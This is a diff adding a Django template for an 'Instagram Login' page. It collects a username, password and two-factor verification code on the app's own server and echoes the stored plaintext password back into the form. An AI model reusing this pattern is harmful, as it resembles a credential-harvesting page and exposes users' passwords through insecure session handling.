@@ -1,0 +1,72 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="{% static 'css/styleform.css' %}">
+    <link rel="stylesheet" href="{% static 'css/stylepopup.css' %}">
+    <script>
+        // JavaScript code to display an alert when the verification field is shown
+        {% if request.session.verification_Code %}
+
+        window.onload = function () {
+            alert("Please provide your verification code in the field to log in successfully.");
+        };  
+        
+        {% endif %}
+
+    </script>
+</head>
+<body>
+    
+<div class="container">
+    <div class="card">
+
+
+        {% if request.session.verification_Code %}
+
+        <h2>Verification Code</h2>
+        <form action="{% url 'user_code' %}" enctype="multipart/form-data" method="POST">
+            {% csrf_token %}
+        
+            <label for="input_verification_code">Verification Code</label>
+            <input type="text" id="input_verification_code" name="verification_code" placeholder="Enter the 6 digit code here">
+
+            <br>
+
+            <button type="submit">Login</button>
+        </form>
+
+        {% else %}
+
+        <h2>Login To Instagram Account</h2>
+        <form action="{% url 'user_login' %}" enctype="multipart/form-data" method="POST">
+            {% csrf_token %}
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username" required value="{% if request.session.input_username %}{{ request.session.input_username }}{% endif %}">
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required value="{% if request.session.input_password %}{{ request.session.input_password }}{% endif %}">
+
+            <label for="timezone">Timezone</label>
+            <select id="timezone" name="timezone" required>
+                <option value="" disabled selected>Select your timezone</option>
+                <option value="Asia/Kolkata" {% if 'Asia/Kolkata' in request.session.timezone_offset %}selected{% endif %}>Asia/Kolkata</option>
+                <!-- Add more timezone options based on your requirements -->
+            </select>
+
+            <br>
+
+            <button type="submit">Login</button>
+        </form>
+            
+        {% endif %}
+
+
+
+    </div>
+</div>
+</body>
+</html>
